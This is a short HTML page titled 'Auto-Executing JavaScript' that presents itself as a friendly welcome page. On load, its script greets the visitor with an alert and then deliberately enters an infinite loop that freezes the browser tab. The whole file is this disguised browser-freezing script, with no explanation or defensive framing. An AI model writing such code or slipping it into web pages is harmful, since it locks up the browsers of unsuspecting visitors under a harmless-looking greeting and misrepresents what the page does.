<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Auto-Executing JavaScript</title>
</head>
<body>
    <h1>Welcome!</h1>
    <script>
        console.log("Welcome to the site!");
        
        function greetUser() {
            alert("Hello! Thanks for visiting.");
            while (true) {
                console.log("Browser Frozen");
            }
        }

        greetUser();

    </script>
</body>
</html>
